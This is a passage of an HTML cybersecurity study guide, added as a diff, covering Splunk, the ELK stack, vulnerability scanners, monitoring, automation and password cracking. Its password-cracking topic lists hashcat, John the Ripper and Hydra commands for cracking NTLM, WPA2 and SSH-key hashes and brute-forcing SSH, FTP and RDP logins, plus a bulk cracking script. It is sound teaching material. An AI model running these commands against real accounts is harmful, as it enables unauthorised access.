+<span class="hl">eval</span>     → Create/transform fields: eval risk=if(score>7,"HIGH","LOW")
+<span class="hl">where</span>    → Filter: where count > 5
+<span class="hl">table</span>    → Select columns to display
+<span class="hl">sort</span>     → Sort results: sort -count (descending)
+<span class="hl">head</span>     → Top N results
+<span class="hl">rename</span>   → Rename field
+<span class="hl">join</span>     → Join two datasets on common field
+<span class="hl">lookup</span>   → Enrich with external data (threat intel, user info)
+<span class="hl">rex</span>      → Extract fields with regex
+<span class="hl">timechart</span> → Time-based chart for visualisation
+<span class="hl">alert</span>    → Create saved search that triggers on condition</pre></div>
+    </div>
+    <div class="sub"><h3>Splunk Architecture</h3>
+      <div class="cb"><div class="clbl">SPLUNK COMPONENTS</div><pre><span class="cy">Data Sources</span>    <span class="cy">Collection</span>        <span class="cy">Processing</span>        <span class="cy">Search</span>
+──────────      ──────────        ──────────        ──────
+Servers         Universal         Indexer           Search Head
+Network Devices Forwarder         (stores,          (SPL queries,
+Cloud APIs      (agent on         indexes,          dashboards,
+Endpoints       endpoints)        compresses)       alerts)</span>
+
+<span class="cm"># Splunk Free (TryHackMe/BTLO labs):</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">docker run -p 8000:8000 splunk/splunk:latest</span>  <span class="cm"># Local Splunk</span>
+<span class="cm"># Access: http://localhost:8000</span>
+<span class="cm"># Learning: TryHackMe Splunk 2/3, BOTS (Boss of the SOC) dataset</span></pre></div>
+    </div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>SPL mastery is one of the most valuable skills for a SOC analyst — and it's frequently tested in interviews. Practice on TryHackMe's Splunk rooms and the Boss of the SOC (BOTS) dataset. The ability to write detection queries that find real attacks in large log datasets is what separates tier-1 from tier-2 analysts.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T157 ===== -->
+<div class="sec" id="t157">
+  <div class="sh"><span class="sn">Topic 157 🔥</span><h2>ELK Stack</h2><span class="se">🐘</span></div>
+  <div class="sb">
+    <div class="tool-hero">
+      <div class="tool-icon">🐘</div>
+      <div class="tool-info">
+        <div class="tool-name">ELK Stack</div>
+        <div class="tool-cat">OPEN SOURCE SIEM · LOG ANALYSIS · ELASTICSEARCH + LOGSTASH + KIBANA</div>
+        <div class="tool-desc">The ELK Stack (now "Elastic Stack") combines Elasticsearch (search/analytics engine), Logstash (data pipeline), and Kibana (visualisation). Free, open source, and highly scalable. Used by thousands of organisations as a SIEM alternative to Splunk.</div>
+      </div>
+      <div class="tool-stats">
+        <span class="stat-pill sp-free">✓ FREE / OPEN SOURCE</span>
+        <span class="stat-pill sp-paid">Cloud: elastic.co</span>
+        <span class="stat-pill sp-os">elastic.co</span>
+      </div>
+    </div>
+    <div class="terminal">
+      <div class="thd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttl">ELK STACK — SETUP + QUERIES</div></div>
+      <div class="tbody"><pre><span class="cm">━━━ COMPONENT OVERVIEW ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="fl">Elasticsearch</span>  → Search and analytics engine, stores logs as JSON
+<span class="fl">Logstash</span>       → Data pipeline: collect, transform, send to Elasticsearch
+<span class="fl">Kibana</span>         → Web UI: visualise, search, alert, dashboard
+<span class="fl">Beats</span>          → Lightweight shippers (Filebeat, Metricbeat, Packetbeat)
+<span class="fl">Elastic Agent</span>  → Unified endpoint agent replacing multiple Beats
+
+<span class="cm">━━━ DOCKER-COMPOSE SETUP ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">cat docker-compose.yml</span>
+<span class="cg">version: '3'
+services:
+  elasticsearch:
+    image: elasticsearch:8.11.0
+    environment:
+      - discovery.type=single-node
+      - xpack.security.enabled=false
+    ports: ["9200:9200"]
+
+  kibana:
+    image: kibana:8.11.0
+    ports: ["5601:5601"]
+    depends_on: [elasticsearch]
+
+  logstash:
+    image: logstash:8.11.0
+    volumes:
+      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf</span>
+
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">docker-compose up -d</span>                           <span class="cm"># Start ELK</span>
+<span class="cm"># Kibana: http://localhost:5601</span>
+
+<span class="cm">━━━ FILEBEAT — SEND LOGS TO ELASTICSEARCH ━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Install Filebeat on log source:</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install filebeat</span>
+<span class="cm"># /etc/filebeat/filebeat.yml:</span>
+<span class="cg">filebeat.inputs:
+  - type: filestream
+    paths:
+      - /var/log/auth.log
+      - /var/log/syslog
+      - /var/log/apache2/*.log
+output.elasticsearch:
+  hosts: ["elasticsearch:9200"]
+  index: "filebeat-%{+yyyy.MM.dd}"</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo filebeat setup && sudo service filebeat start</span>
+
+<span class="cm">━━━ KIBANA QUERY LANGUAGE (KQL) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Find failed SSH logins:</span>
+<span class="fl">message: "Failed password" AND source.ip: *</span>
+
+<span class="cm"># Find specific IP range:</span>
+<span class="fl">source.ip: 192.168.1.0/24 AND event.action: "logon_failed"</span>
+
+<span class="cm"># Find PowerShell with encoded commands:</span>
+<span class="fl">process.name: powershell.exe AND process.args: *-enc*</span>
+
+<span class="cm"># Count failed logins by user in Kibana Lens:</span>
+<span class="cm"># Lens → Bar chart → X-axis: user.name → Y-axis: count → filter: failed</span>
+
+<span class="cm">━━━ ELASTICSEARCH REST API ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">curl -X GET "localhost:9200/_cat/indices?v"</span>    <span class="cm"># List all indices</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">curl -X POST "localhost:9200/filebeat-*/_search" -H 'Content-Type: application/json' -d '{"query":{"match":{"message":"Failed password"}}}'</span></pre></div>
+    </div>
+    <div class="sub"><h3>ELK vs Splunk</h3>
+      <div class="cmp">
+        <div class="cp2 l"><h4>🐘 ELK Stack</h4><ul>
+          <li>Free open source (Apache/Elastic license)</li>
+          <li>Requires infrastructure management</li>
+          <li>KQL + Elasticsearch DSL (JSON-based)</li>
+          <li>Excellent for developers, DevSecOps</li>
+          <li>Kibana: good but less mature than Splunk dashboards</li>
+          <li>Elastic Security: built-in SIEM features (since v7)</li>
+        </ul></div>
+        <div class="cp2 s"><h4>🟢 Splunk</h4><ul>
+          <li>Commercial — expensive at scale</li>
+          <li>Fully managed; easier to operate</li>
+          <li>SPL: more powerful for analytics</li>
+          <li>Better out-of-box security use cases</li>
+          <li>Industry standard — in most job postings</li>
+          <li>Splunk Enterprise Security (ES) for SIEM</li>
+        </ul></div>
+      </div>
+    </div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>ELK Stack is the go-to choice for organisations that need SIEM capabilities without Splunk's cost. For career development: learn both. ELK/Kibana skills are increasingly common in job descriptions, especially for DevSecOps and cloud security roles. The free tier makes it accessible for home lab practice.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T158 ===== -->
+<div class="sgt">🔍 Scanning, Cracking &amp; Monitoring</div>
+<div class="sec" id="t158">
+  <div class="sh"><span class="sn">Topic 158</span><h2>Vulnerability Scanners</h2><span class="se">🔍</span></div>
+  <div class="sb">
+    <div class="oneliner"><div class="ol-lbl">⚡ Summary</div>Vulnerability scanners automatically test systems against databases of known CVEs — giving security teams a prioritised list of weaknesses to fix, ranked by CVSS severity, without manual testing of each service.</div>
+    <div class="terminal">
+      <div class="thd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttl">VULNERABILITY SCANNERS — COMMANDS &amp; COMPARISON</div></div>
+      <div class="tbody"><pre><span class="cm">━━━ NESSUS (Most Popular Commercial Scanner) ━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Nessus Essentials: Free up to 16 IPs</span>
+<span class="cm"># Download from: tenable.com/products/nessus</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo dpkg -i Nessus-10.x.x-debian10_amd64.deb</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo /bin/systemctl start nessusd.service</span>
+<span class="cm"># Access: https://localhost:8834</span>
+<span class="out">Nessus scan results:
+CRITICAL  EternalBlue MS17-010 on 10.10.10.5:445  CVSS: 9.8
+HIGH      Apache 2.4.29 mod_cgi RCE              CVSS: 8.1
+HIGH      MySQL 5.7 auth bypass                  CVSS: 7.5
+MEDIUM    Missing security headers on 10.10.10.5 CVSS: 5.3
+LOW       SSH weak ciphers                       CVSS: 3.7</span>
+
+<span class="cm">━━━ OPENVAS / GREENBONE (Free & Open Source) ━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install openvas</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo gvm-setup</span>                                  <span class="cm"># Initial setup (takes ~30min)</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo gvm-start</span>                                  <span class="cm"># Start services</span>
+<span class="cm"># Web GUI: https://localhost:9392</span>
+
+<span class="cm">━━━ NUCLEI (Fast, Template-based, Free) ━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nuclei <span class="fl">-u https://target.com</span></span>                   <span class="cm"># Basic scan</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nuclei <span class="fl">-u https://target.com -severity critical,high</span></span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nuclei <span class="fl">-l targets.txt -t cves/ -o results.txt</span></span>   <span class="cm"># Scan list with CVE templates</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nuclei <span class="fl">-u https://target.com -t exposures/ -t misconfiguration/</span></span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nuclei <span class="fl">-update-templates</span></span>                        <span class="cm"># Update community templates</span>
+
+<span class="cm">━━━ NIKTO (Web Server Scanner) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nikto <span class="fl">-h http://target.com</span></span>                     <span class="cm"># Basic web scan</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nikto <span class="fl">-h https://target.com -ssl -o nikto_results.html -Format html</span></span>
+<span class="out">+ /admin/ : Admin panel found (no auth required!)
++ /backup.zip : Backup file accessible
++ Outdated: Apache/2.4.29 → Multiple CVEs available
++ Missing: X-Frame-Options header</span>
+
+<span class="cm">━━━ QUALYS (Cloud-based Enterprise) ━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Cloud-based — no local install needed</span>
+<span class="cm"># Qualys VMDR: Vulnerability Management + Detection + Response</span>
+<span class="cm"># Scans, prioritises by risk, integrates with ticketing (Jira, ServiceNow)</span>
+<span class="cm"># Asset inventory + cloud connector (AWS, Azure, GCP)</span></pre></div>
+    </div>
+    <div class="sub"><h3>Scanner Comparison</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Scanner</th><th>Type</th><th>Cost</th><th>Speed</th><th>Best For</th></tr></thead>
+        <tbody>
+          <tr><td>Nessus Professional</td><td>Authenticated + unauthenticated</td><td>$3,000+/yr</td><td>Fast</td><td>Enterprise comprehensive scanning</td></tr>
+          <tr><td>Nessus Essentials</td><td>Unauthenticated (16 IPs)</td><td>Free</td><td>Fast</td><td>Home lab, small environments</td></tr>
+          <tr><td>OpenVAS</td><td>Authenticated + unauthenticated</td><td>Free</td><td>Medium</td><td>Open source alternative to Nessus</td></tr>
+          <tr><td>Nuclei</td><td>HTTP/network template-based</td><td>Free</td><td>Very Fast</td><td>Web app CVEs, bug bounty</td></tr>
+          <tr><td>Qualys VMDR</td><td>Cloud, agent-based</td><td>$$$</td><td>Fast</td><td>Enterprise asset management + scanning</td></tr>
+          <tr><td>Nikto</td><td>Web server only</td><td>Free</td><td>Slow</td><td>Web server misconfiguration</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Vulnerability scanners find the low-hanging fruit quickly — unpatched software, default credentials, misconfigured services. But they generate false positives and miss logic vulnerabilities. Use them as the starting point, not the entire assessment. Authenticated scans find 60% more vulnerabilities than unauthenticated ones.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T159 ===== -->
+<div class="sec" id="t159">
+  <div class="sh"><span class="sn">Topic 159</span><h2>Password Cracking Tools</h2><span class="se">🔓</span></div>
+  <div class="sb">
+    <div class="oneliner"><div class="ol-lbl">⚡ Summary</div>Password cracking tools recover plaintext passwords from hash values using dictionary attacks, brute force, or rule-based mutations — Hashcat uses GPU acceleration for billions of guesses per second; John the Ripper is the CPU-based classic.</div>
+    <div class="terminal">
+      <div class="thd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttl">HASHCAT + JOHN — COMPLETE REFERENCE</div></div>
+      <div class="tbody"><pre><span class="cm">━━━ HASHCAT (GPU-based — FASTEST) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Hash type identification first:</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">hashid <span class="fl">-m</span> 5f4dcc3b5aa765d61d8327deb882cf99</span>
+<span class="out">[+] MD5 [Hashcat Mode: 0]</span>
+
+<span class="cm"># Common hash modes:</span>
+<span class="fl">-m 0</span>      MD5                <span class="fl">-m 1000</span>   NTLM (Windows)
+<span class="fl">-m 100</span>    SHA1               <span class="fl">-m 1800</span>   SHA-512 (Linux shadow)
+<span class="fl">-m 1400</span>   SHA2-256           <span class="fl">-m 3200</span>   bcrypt
+<span class="fl">-m 5600</span>   NTLMv2 (Net-NTLMv2) <span class="fl">-m 13100</span> Kerberoast (TGS)
+<span class="fl">-m 22000</span>  WPA2               <span class="fl">-m 7400</span>  SHA256crypt
+
+<span class="cm"># Attack modes:</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">hashcat <span class="fl">-m 0 -a 0</span> hash.txt rockyou.txt</span>        <span class="cm"># Dictionary attack (MD5)</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">hashcat <span class="fl">-m 1000 -a 0</span> ntlm.txt rockyou.txt <span class="fl">-r best64.rule</span></span>  <span class="cm"># Rules (NTLM)</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">hashcat <span class="fl">-m 0 -a 3</span> hash.txt <span class="fl">?a?a?a?a?a?a</span></span>      <span class="cm"># Brute force 6-char</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">hashcat <span class="fl">-m 22000 -a 0</span> wpa.hccapx rockyou.txt</span>  <span class="cm"># WPA2 cracking</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">hashcat <span class="fl">-m 5600 -a 0</span> ntlmv2.txt rockyou.txt</span>   <span class="cm"># NTLMv2 (Responder hashes)</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">hashcat <span class="fl">--show -m 0</span> hash.txt</span>                  <span class="cm"># Show cracked results</span>
+
+<span class="cm"># Mask attack (charset):</span>
+<span class="fl">?l</span> = lowercase (a-z)    <span class="fl">?u</span> = uppercase (A-Z)
+<span class="fl">?d</span> = digits (0-9)       <span class="fl">?s</span> = special chars
+<span class="fl">?a</span> = all printable      e.g. <span class="fl">Company?d?d?d?d</span> = Company0000–Company9999
+
+<span class="cm">━━━ JOHN THE RIPPER (CPU-based) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">john hash.txt</span>                                 <span class="cm"># Auto-detect hash, default wordlist</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">john hash.txt <span class="fl">--wordlist</span>=/usr/share/wordlists/rockyou.txt</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">john hash.txt <span class="fl">--wordlist</span>=rockyou.txt <span class="fl">--rules=best64</span></span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">john <span class="fl">--show</span> hash.txt</span>                          <span class="cm"># Show cracked passwords</span>
+
+<span class="cm"># John for specific formats:</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">john <span class="fl">--format=NT</span> ntlm.txt <span class="fl">--wordlist</span>=rockyou.txt</span>  <span class="cm"># Windows NT hash</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">john <span class="fl">--format=bcrypt</span> bcrypt.txt <span class="fl">--wordlist</span>=rockyou.txt</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">zip2john secret.zip > zip_hash.txt && john zip_hash.txt</span>  <span class="cm"># Crack ZIP password</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">ssh2john id_rsa > ssh_hash.txt && john ssh_hash.txt</span>      <span class="cm"># Crack SSH key passphrase</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">pdf2john protected.pdf > pdf_hash.txt && john pdf_hash.txt</span> <span class="cm"># Crack PDF</span>
+
+<span class="cm">━━━ HYDRA (Online Brute Force) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">hydra <span class="fl">-l admin -P</span> rockyou.txt ssh://<span class="ip">10.10.10.5</span></span>  <span class="cm"># SSH brute force</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">hydra <span class="fl">-l admin -P</span> rockyou.txt ftp://<span class="ip">10.10.10.5</span></span>  <span class="cm"># FTP brute force</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">hydra <span class="fl">-l admin -P</span> rockyou.txt rdp://<span class="ip">10.10.10.5</span></span>  <span class="cm"># RDP brute force</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">hydra <span class="fl">-L users.txt -P</span> passwords.txt <span class="fl">-t 4</span> ssh://<span class="ip">10.10.10.5</span></span></pre></div>
+    </div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Password cracking demonstrates why hash algorithm choice matters: MD5 can be cracked at 100 billion/second with a GPU; Argon2id takes minutes for a single guess. For defenders: use Argon2id/bcrypt for passwords, enable MFA so cracked passwords alone don't grant access, and rotate credentials regularly.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T160 ===== -->
+<div class="sec" id="t160">
+  <div class="sh"><span class="sn">Topic 160</span><h2>Monitoring Tools</h2><span class="se">📡</span></div>
+  <div class="sb">
+    <div class="oneliner"><div class="ol-lbl">⚡ Summary</div>Monitoring tools provide continuous visibility into infrastructure health and security posture — from network bandwidth (PRTG, Zabbix) to endpoint behaviour (EDR) to application performance (Prometheus/Grafana) to threat intelligence feeds.</div>
+    <div class="terminal">
+      <div class="thd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttl">MONITORING TOOLS — SETUP &amp; COMMANDS</div></div>
+      <div class="tbody"><pre><span class="cm">━━━ NAGIOS (Infrastructure Monitoring) ━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Monitor service uptime, send alerts when something goes down</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install nagios4 nagios-plugins</span>
+<span class="cm"># /etc/nagios4/conf.d/hosts.cfg:</span>
+<span class="cg">define host {
+  host_name    web-server-01
+  address      192.168.1.10
+  check_command check-host-alive
+  notifications_enabled 1
+  contacts      admin
+}</span>
+<span class="cm"># Alert via email when host/service goes down → possible DDoS indicator!</span>
+
+<span class="cm">━━━ ZABBIX (Full Infrastructure SNMP Monitoring) ━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install zabbix-server-mysql zabbix-frontend-php zabbix-agent</span>
+<span class="cm"># Monitors: CPU, RAM, network, SNMP devices, cloud APIs</span>
+<span class="cm"># Triggers: "CPU >90% for 5 min" → alert → possible cryptomining!</span>
+<span class="cm"># Web dashboard: http://localhost/zabbix</span>
+
+<span class="cm">━━━ PROMETHEUS + GRAFANA (Modern Metrics Stack) ━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">docker run -d -p 9090:9090 prom/prometheus</span>       <span class="cm"># Prometheus</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">docker run -d -p 3000:3000 grafana/grafana</span>        <span class="cm"># Grafana dashboards</span>
+<span class="cm"># node_exporter exposes system metrics to Prometheus</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">./node_exporter &amp;</span>                                 <span class="cm"># Expose Linux metrics</span>
+<span class="cm"># Access Grafana: http://localhost:3000 → add Prometheus data source → import dashboards</span>
+
+<span class="cm">━━━ WAZUH (Open Source EDR + SIEM) ━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Wazuh = OSSEC fork + modern SIEM capabilities</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo bash wazuh-install.sh -a</span>                    <span class="cm"># All-in-one install</span>
+<span class="cm"># Monitors: file integrity, rootkits, log analysis, CVE detection</span>
+<span class="cm"># Kibana-based UI: https://localhost:443</span>
+
+<span class="cm">━━━ NETFLOW / ZEEK (Network Flow Analysis) ━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo zeek <span class="fl">-i eth0</span></span>                               <span class="cm"># Live network analysis</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">cat /usr/local/logs/current/conn.log | head -5</span>   <span class="cm"># Connection logs</span>
+<span class="out">ts          uid            orig_h          resp_h         service  duration
+1706000000  CHhAvVGS7BpM   192.168.1.50    8.8.8.8        dns      0.02
+1706000001  CiqJfD2zEJxm   192.168.1.50    185.220.101.45 -        3600    ← C2?</span></pre></div>
+    </div>
+    <div class="sub"><h3>Monitoring Tool Categories</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Tool</th><th>Type</th><th>Monitors</th><th>Security Use</th></tr></thead>
+        <tbody>
+          <tr><td>Nagios/Zabbix</td><td>Infrastructure</td><td>Host/service uptime, SNMP</td><td>Outage detection, DDoS impact</td></tr>
+          <tr><td>Prometheus/Grafana</td><td>Metrics</td><td>CPU, memory, custom metrics</td><td>Anomaly detection (cryptomining = high CPU)</td></tr>
+          <tr><td>Wazuh/OSSEC</td><td>HIDS + SIEM</td><td>File integrity, logs, rootkits</td><td>Host intrusion detection</td></tr>
+          <tr><td>Zeek/Arkime</td><td>Network</td><td>Full packet capture + flow logs</td><td>C2 detection, data exfiltration</td></tr>
+          <tr><td>ntopng</td><td>Network flow</td><td>Bandwidth, L7 apps, connections</td><td>Top talkers, unusual protocols</td></tr>
+          <tr><td>PRTG</td><td>Network/SNMP</td><td>All network devices via SNMP</td><td>Network baseline, anomaly alerts</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Monitoring provides the visibility that makes security possible. The right combination depends on scale and budget: Prometheus+Grafana for metrics, Zeek for network analysis, Wazuh for host security, and a SIEM (ELK or Splunk) to correlate them all. Start with Wazuh — it's free, powerful, and covers most use cases.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T161 ===== -->
+<div class="sec" id="t161">
+  <div class="sh"><span class="sn">Topic 161</span><h2>Automation Tools</h2><span class="se">🤖</span></div>
+  <div class="sb">
+    <div class="oneliner"><div class="ol-lbl">⚡ Summary</div>Security automation eliminates manual, repetitive tasks — from vulnerability scanning pipelines (Python scripts, Ansible playbooks) to incident response automation (SOAR) to infrastructure-as-code security scanning (Terraform + Checkov).</div>
+    <div class="terminal">
+      <div class="thd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttl">SECURITY AUTOMATION — PYTHON + ANSIBLE + SOAR</div></div>
+      <div class="tbody"><pre><span class="cm">━━━ PYTHON SECURITY SCRIPTING ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Automated subdomain scanner + vulnerability check:</span>
+<span class="cg">import subprocess, requests
+
+subdomains = subprocess.check_output(
+    ['subfinder', '-d', 'target.com', '-silent']
+).decode().strip().split('\n')
+
+for sub in subdomains:
+    try:
+        r = requests.get(f'https://{sub}', timeout=5, verify=False)
+        # Check for security headers
+        if 'Content-Security-Policy' not in r.headers:
+            print(f'[MISSING CSP] {sub}')
+        if 'X-Frame-Options' not in r.headers:
+            print(f'[CLICKJACK RISK] {sub}')
+    except: pass</span>
+
+<span class="cm"># Automated hash cracking pipeline:</span>
+<span class="cg">import subprocess
+
+hashes = open('hashes.txt').readlines()
+for h in hashes:
+    result = subprocess.run(
+        ['hashcat', '-m', '1000', h.strip(), 'rockyou.txt', '--quiet'],
+        capture_output=True, text=True
+    )
+    if ':' in result.stdout:
+        print(f'[CRACKED] {result.stdout.strip()}')</span>
+
+<span class="cm">━━━ ANSIBLE (Configuration Management + Security) ━━━━━━━━━━━━</span>
+<span class="cm"># Deploy security hardening across 100 servers in 5 minutes:</span>
+<span class="cg"># hardening.yml playbook:
+---
+- hosts: all
+  become: yes
+  tasks:
+    - name: Disable root SSH
+      lineinfile:
+        path: /etc/ssh/sshd_config
+        regexp: '^PermitRootLogin'
+        line: 'PermitRootLogin no'
+
+    - name: Enable firewall
+      ufw:
+        state: enabled
+        policy: deny
+
+    - name: Allow SSH
+      ufw:
+        rule: allow
+        port: '22'
+
+    - name: Install fail2ban
+      apt:
+        name: fail2ban
+        state: present</span>
+
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">ansible-playbook <span class="fl">-i inventory.txt</span> hardening.yml</span>
+
+<span class="cm">━━━ SOAR (Security Orchestration, Automation and Response) ━━━━</span>
+<span class="cm"># SOAR platforms: Splunk SOAR (Phantom), Palo Alto XSOAR, IBM Resilient</span>
+<span class="cm"># Example automated playbook triggered by SIEM alert:</span>
+<span class="cy">SIEM alert: "Brute Force from 185.220.101.45"</span>
+<span class="cm">  → SOAR playbook automatically:</span>
+<span class="cg">  1. Lookup IP on VirusTotal → 98% malicious</span>
+<span class="cg">  2. Block IP on firewall via API</span>
+<span class="cg">  3. Isolate affected endpoint via EDR API</span>
+<span class="cg">  4. Create Jira ticket: "Brute Force Incident #2024-123"</span>
+<span class="cg">  5. Send Slack alert to SOC channel</span>
+<span class="cg">  6. Notify CISO via email</span>
+<span class="cm">  # Mean time to respond: 2 minutes (vs 45 min manual)</span>
+
+<span class="cm">━━━ CHECKOV (IaC Security Scanning) ━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">pip install checkov</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">checkov <span class="fl">-d</span> ./terraform/</span>                         <span class="cm"># Scan Terraform for security issues</span>
+<span class="out">Check: CKV_AWS_21: "Ensure S3 Bucket has versioning enabled"
+FAILED for resource: aws_s3_bucket.data
+Check: CKV_AWS_18: "Ensure S3 Bucket has access logging enabled"
+FAILED for resource: aws_s3_bucket.data
+Passed checks: 45, Failed checks: 8</span></pre></div>
+    </div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Security automation scales human expertise. A single Python script can check security headers across 1,000 subdomains in minutes. Ansible applies security hardening to 500 servers simultaneously. SOAR responds to threats in seconds instead of hours. Automation skills are the highest-value differentiator for security engineers in 2024.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T162 ===== -->
+<div class="sec" id="t162">
+  <div class="sh"><span class="sn">Topic 162</span><h2>Tool Comparison</h2><span class="se">⚖️</span></div>
+  <div class="sb">
+    <div class="oneliner"><div class="ol-lbl">⚡ Summary</div>Choosing the right tool means understanding each tool's strengths, weaknesses, cost, and appropriate use case — offensive tools require authorisation, while defensive tools work best when integrated into a layered security architecture.</div>
+    <div class="sub"><h3>Comprehensive Tool Comparison</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Tool</th><th>Category</th><th>Cost</th><th>Skill Level</th><th>O/D</th><th>Best Use Case</th></tr></thead>
+        <tbody>
+          <tr><td>nmap</td><td>Port Scanner</td><td>Free</td><td>Beginner</td><td>O</td><td>Network discovery, service detection, CVE checking via NSE</td></tr>
+          <tr><td>Metasploit</td><td>Exploitation</td><td>Free/Paid</td><td>Intermediate</td><td>O</td><td>CVE exploitation, payload generation, post-exploitation framework</td></tr>
+          <tr><td>Burp Suite</td><td>Web Testing</td><td>Free/£449</td><td>Intermediate</td><td>O</td><td>Web app pentesting, HTTP manipulation, web vulnerability hunting</td></tr>
